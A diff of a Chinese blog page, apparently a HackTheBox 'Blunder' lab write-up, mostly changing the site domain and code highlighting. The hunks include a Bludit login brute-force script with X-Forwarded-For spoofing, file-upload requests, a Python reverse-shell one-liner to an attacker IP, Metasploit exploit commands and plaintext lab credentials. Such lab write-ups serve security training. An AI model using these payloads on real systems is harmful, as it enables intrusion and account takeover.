@@ -8,17 +8,17 @@
         <title>HTB Blunder Writeup - Leon&#39;s Blog</title><meta name="Description" content="Leon&#39;s Blog-Keep learning web security"><meta property="og:title" content="HTB Blunder Writeup" />
 <meta property="og:description" content="HTB Blunder 靶机渗透笔记" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://clq0.top/htb-blunder-writeup/" />
-<meta property="og:image" content="https://clq0.top/logo_.jpg"/>
+<meta property="og:url" content="https://blog.h4ck.fun/htb-blunder-writeup/" /><meta property="og:image" content="https://blog.h4ck.fun/logo_.jpg"/><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2020-07-10T15:22:34+08:00" />
 <meta property="article:modified_time" content="2020-07-10T15:22:34+08:00" />
+
 <meta name="twitter:card" content="summary_large_image"/>
-<meta name="twitter:image" content="https://clq0.top/logo_.jpg"/>
+<meta name="twitter:image" content="https://blog.h4ck.fun/logo_.jpg"/>
 
 <meta name="twitter:title" content="HTB Blunder Writeup"/>
 <meta name="twitter:description" content="HTB Blunder 靶机渗透笔记"/>
 <meta name="application-name" content="Leon&#39;s Blog">
-<meta name="apple-mobile-web-app-title" content="Leon&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/logo.svg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://clq0.top/htb-blunder-writeup/" /><link rel="prev" href="https://clq0.top/php%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E6%96%87%E4%BB%B6%E5%92%8Crce/" /><link rel="next" href="https://clq0.top/htb-traceback-writeup/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+<meta name="apple-mobile-web-app-title" content="Leon&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/logo.svg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://blog.h4ck.fun/htb-blunder-writeup/" /><link rel="prev" href="https://blog.h4ck.fun/php%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E6%96%87%E4%BB%B6%E5%92%8Crce/" /><link rel="next" href="https://blog.h4ck.fun/htb-traceback-writeup/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
     {
         "@context": "http://schema.org",
         "@type": "BlogPosting",
@@ -26,11 +26,11 @@
         "inLanguage": "zh-CN",
         "mainEntityOfPage": {
             "@type": "WebPage",
-            "@id": "https:\/\/clq0.top\/htb-blunder-writeup\/"
-        },"genre": "posts","keywords": "Penetration","wordcount":  1353 ,
-        "url": "https:\/\/clq0.top\/htb-blunder-writeup\/","datePublished": "2020-07-10T15:22:34+08:00","dateModified": "2020-07-10T15:22:34+08:00","publisher": {
+            "@id": "https:\/\/blog.h4ck.fun\/htb-blunder-writeup\/"
+        },"genre": "posts","keywords": "Penetration","wordcount":  1352 ,
+        "url": "https:\/\/blog.h4ck.fun\/htb-blunder-writeup\/","datePublished": "2020-07-10T15:22:34+08:00","dateModified": "2020-07-10T15:22:34+08:00","publisher": {
             "@type": "Organization",
-            "name": "Leon","logo": "https:\/\/clq0.top\/logo_.jpg"},"author": {
+            "name": "Leon","logo": "https:\/\/blog.h4ck.fun\/logo_.jpg"},"author": {
                 "@type": "Person",
                 "name": "Leon"
             },"description": ""
@@ -104,7 +104,7 @@
             <div class="toc-content" id="toc-content-auto"></div>
         </div><article class="page single"><h1 class="single-title animated flipInX">HTB Blunder Writeup</h1><div class="post-meta">
             <div class="post-meta-line"><span class="post-author"><a href="http://clq0.top" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw"></i>Leon</a></span>&nbsp;<span class="post-category">included in <a href="/categories/writeup/"><i class="far fa-folder fa-fw"></i>Writeup</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2020-07-10">2020-07-10</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;1353 words&nbsp;
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2020-07-10">2020-07-10</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;1352 words&nbsp;
                 <i class="far fa-clock fa-fw"></i>&nbsp;3 minutes&nbsp;<span id="/htb-blunder-writeup/" class="leancloud_visitors" data-flag-title="HTB Blunder Writeup">
                         <i class="far fa-eye fa-fw"></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;views
                     </span>&nbsp;</div>
@@ -196,7 +196,7 @@
 <p>使用脚本爆破：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -240,9 +240,9 @@
 </span><span class="lnt">42
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">re</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">re</span>
 <span class="kn">import</span> <span class="nn">requests</span>
-<span class="c1">#from __future__ import print_function</span>
+<span class="c1">#from __future__ import print_function</span>
 
 <span class="k">def</span> <span class="nf">open_ressources</span><span class="p">(</span><span class="n">file_path</span><span class="p">):</span>
     <span class="k">return</span> <span class="p">[</span><span class="n">item</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">)</span> <span class="k">for</span> <span class="n">item</span> <span class="ow">in</span> <span class="nb">open</span><span class="p">(</span><span class="n">file_path</span><span class="p">)</span><span class="o">.</span><span class="n">readlines</span><span class="p">()]</span>
@@ -257,7 +257,7 @@
     <span class="n">login_page</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">login_url</span><span class="p">)</span>
     <span class="n">csrf_token</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s1">&#39;input.+?name=&#34;tokenCSRF&#34;.+?value=&#34;(.+?)&#34;&#39;</span><span class="p">,</span> <span class="n">login_page</span><span class="o">.</span><span class="n">text</span><span class="p">)</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
 
-    <span class="k">print</span><span class="p">(</span><span class="s1">&#39;[*] Trying: {p}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">p</span> <span class="o">=</span> <span class="n">password</span><span class="p">))</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[*] Trying: </span><span class="si">{p}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">p</span> <span class="o">=</span> <span class="n">password</span><span class="p">))</span>
 
     <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
         <span class="s1">&#39;X-Forwarded-For&#39;</span><span class="p">:</span> <span class="n">password</span><span class="p">,</span>
@@ -272,14 +272,14 @@
         <span class="s1">&#39;save&#39;</span><span class="p">:</span> <span class="s1">&#39;&#39;</span>
     <span class="p">}</span>
 
-    <span class="n">login_result</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">login_url</span><span class="p">,</span> <span class="n">headers</span> <span class="o">=</span> <span class="n">headers</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">,</span> <span class="n">allow_redirects</span> <span class="o">=</span> <span class="bp">False</span><span class="p">)</span>
+    <span class="n">login_result</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">login_url</span><span class="p">,</span> <span class="n">headers</span> <span class="o">=</span> <span class="n">headers</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">,</span> <span class="n">allow_redirects</span> <span class="o">=</span> <span class="kc">False</span><span class="p">)</span>
 
     <span class="k">if</span> <span class="s1">&#39;location&#39;</span> <span class="ow">in</span> <span class="n">login_result</span><span class="o">.</span><span class="n">headers</span><span class="p">:</span>
         <span class="k">if</span> <span class="s1">&#39;/admin/dashboard&#39;</span> <span class="ow">in</span> <span class="n">login_result</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s1">&#39;location&#39;</span><span class="p">]:</span>
-            <span class="k">print</span><span class="p">()</span>
-            <span class="k">print</span><span class="p">(</span><span class="s1">&#39;SUCCESS: Password found!&#39;</span><span class="p">)</span>
-            <span class="k">print</span><span class="p">(</span><span class="s1">&#39;Use {u}:{p} to login.&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">u</span> <span class="o">=</span> <span class="n">username</span><span class="p">,</span> <span class="n">p</span> <span class="o">=</span> <span class="n">password</span><span class="p">))</span>
-            <span class="k">print</span><span class="p">()</span>
+            <span class="nb">print</span><span class="p">()</span>
+            <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;SUCCESS: Password found!&#39;</span><span class="p">)</span>
+            <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Use </span><span class="si">{u}</span><span class="s1">:</span><span class="si">{p}</span><span class="s1"> to login.&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">u</span> <span class="o">=</span> <span class="n">username</span><span class="p">,</span> <span class="n">p</span> <span class="o">=</span> <span class="n">password</span><span class="p">))</span>
+            <span class="nb">print</span><span class="p">()</span>
             <span class="k">break</span>
 
 </code></pre></td></tr></table>
@@ -298,7 +298,7 @@
 <p>然后抓包修改为：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -327,7 +327,7 @@
 </span><span class="lnt">27
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-http" data-lang="http"><span class="nf">POST</span> <span class="nn">/admin/ajax/upload-images</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="nf">POST</span> <span class="nn">/admin/ajax/upload-images</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
 <span class="n">Host</span><span class="o">:</span> <span class="l">10.10.10.191</span>
 <span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span>
 <span class="n">Accept</span><span class="o">:</span> <span class="l">*/*</span>
@@ -367,7 +367,7 @@ ceb56bf227d17480762ba33e8a3afce642adca4e
 <p>上传<code>.htaccess</code>：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -397,7 +397,7 @@ ceb56bf227d17480762ba33e8a3afce642adca4e
 </span><span class="lnt">28
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-http" data-lang="http"><span class="nf">POST</span> <span class="nn">/admin/ajax/upload-images</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="nf">POST</span> <span class="nn">/admin/ajax/upload-images</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
 <span class="n">Host</span><span class="o">:</span> <span class="l">10.10.10.191</span>
 <span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span>
 <span class="n">Accept</span><span class="o">:</span> <span class="l">*/*</span>
@@ -439,10 +439,10 @@ ceb56bf227d17480762ba33e8a3afce642adca4e
 <p>使用python反弹个交互shell：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.191</span><span class="o">/</span><span class="n">bl</span><span class="o">-</span><span class="n">content</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">leon</span><span class="o">.</span><span class="n">php</span><span class="err">?</span><span class="n">aaa</span><span class="o">=</span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.14.44&#34;,9800));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.10.191</span><span class="o">/</span><span class="n">bl</span><span class="o">-</span><span class="n">content</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">leon</span><span class="o">.</span><span class="n">php</span><span class="err">?</span><span class="n">aaa</span><span class="o">=</span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.14.44&#34;,9800));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;</span>
 </code></pre></td></tr></table>
 </div>
 </div><p><img
@@ -477,7 +477,7 @@ ceb56bf227d17480762ba33e8a3afce642adca4e
 <p>于是换成了msf获取，msf上已经有了这个洞的exp：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -488,10 +488,10 @@ ceb56bf227d17480762ba33e8a3afce642adca4e
 </span><span class="lnt">9
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">msf5 &gt; use exploit/linux/http/bludit_upload_images_exec
-msf5 exploit<span class="o">(</span>linux/http/bludit_upload_images_exec<span class="o">)</span> &gt; <span class="nb">set</span> TARGET 0
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">msf5 &gt; use exploit/linux/http/bludit_upload_images_exec
+msf5 exploit<span class="o">(</span>linux/http/bludit_upload_images_exec<span class="o">)</span> &gt; <span class="nb">set</span> TARGET <span class="m">0</span>
 msf5 exploit<span class="o">(</span>linux/http/bludit_upload_images_exec<span class="o">)</span> &gt; <span class="nb">set</span> RHOST 10.10.10.191
-msf5 exploit<span class="o">(</span>linux/http/bludit_upload_images_exec<span class="o">)</span> &gt; <span class="nb">set</span> RPORT 80
+msf5 exploit<span class="o">(</span>linux/http/bludit_upload_images_exec<span class="o">)</span> &gt; <span class="nb">set</span> RPORT <span class="m">80</span>
 msf5 exploit<span class="o">(</span>linux/http/bludit_upload_images_exec<span class="o">)</span> &gt; <span class="nb">set</span> BLUDITUSER fergus
 <span class="nv">BLUDITUSER</span> <span class="o">=</span>&gt; fergus
 msf5 exploit<span class="o">(</span>linux/http/bludit_upload_images_exec<span class="o">)</span> &gt; <span class="nb">set</span> BLUDITPASS RolandDeschain
@@ -502,7 +502,7 @@ msf5 exploit<span class="o">(</span>linux/http/bludit_upload_images_exec<span cl
 </div><p>然后获得交互shell：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -511,7 +511,7 @@ msf5 exploit<span class="o">(</span>linux/http/bludit_upload_images_exec<span cl
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">meterpreter &gt; shell
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">meterpreter &gt; shell
 Process <span class="m">4872</span> created.
 Channel <span class="m">0</span> created.
 id
@@ -523,14 +523,14 @@ www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$
 </div><p>切换为<code>hugo</code>：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ su hugo
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ su hugo
 su hugo
 Password: Password120
 
@@ -540,7 +540,7 @@ hugo@blunder:/var/www/bludit-3.10.0a/bl-content/databases$
 </div><p>查看下<code>sudo</code>权限：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -552,7 +552,7 @@ hugo@blunder:/var/www/bludit-3.10.0a/bl-content/databases$
 </span><span class="lnt">10
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">hugo@blunder:~$ sudo -l
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">hugo@blunder:~$ sudo -l
 sudo -l
 Password: Password120
 
@@ -603,7 +603,7 @@ User hugo may run the following commands on blunder:
         <div class="post-info-line">
             <div class="post-info-md"></div>
             <div class="post-info-share">
-                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://clq0.top/htb-blunder-writeup/" data-title="HTB Blunder Writeup" data-hashtags="Penetration"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://clq0.top/htb-blunder-writeup/" data-hashtag="Penetration"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://clq0.top/htb-blunder-writeup/"><i class="fab fa-reddit fa-fw"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://clq0.top/htb-blunder-writeup/" data-title="HTB Blunder Writeup"><i class="fab fa-weibo fa-fw"></i></a></span>
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://blog.h4ck.fun/htb-blunder-writeup/" data-title="HTB Blunder Writeup" data-via="Le0nsec" data-hashtags="Penetration"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://blog.h4ck.fun/htb-blunder-writeup/" data-hashtag="Penetration"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://blog.h4ck.fun/htb-blunder-writeup/"><i class="fab fa-reddit fa-fw"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://blog.h4ck.fun/htb-blunder-writeup/" data-title="HTB Blunder Writeup"><i class="fab fa-weibo fa-fw"></i></a></span>
             </div>
         </div>
     </div>
@@ -622,7 +622,7 @@ User hugo may run the following commands on blunder:
                 Please enable JavaScript to view the comments powered by <a href="https://valine.js.org/">Valine</a>.
             </noscript></div></article></div>
             </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line"><a>本网站由</a><a href="https://www.upyun.com/?utm_source=lianmeng&utm_medium=referral" target="-blank"><img src="/upyun_logo2.png" width="4%" style="vertical-align:middle"></a><a>提供CDN加速/云存储服务</a></div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2020 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="http://clq0.top" target="_blank">Leon</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span><span class="icp-splitter">&nbsp;|&nbsp;</span><br class="icp-br"/>
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2020 - 2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="http://clq0.top" target="_blank">Leon</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span><span class="icp-splitter">&nbsp;|&nbsp;</span><br class="icp-br"/>
                     <span class="icp"><script type="text/javascript" src="https://s9.cnzz.com/z_stat.php?id=1278765080&web_id=1278765080"></script></span></div>
         </div>
     </footer></div>
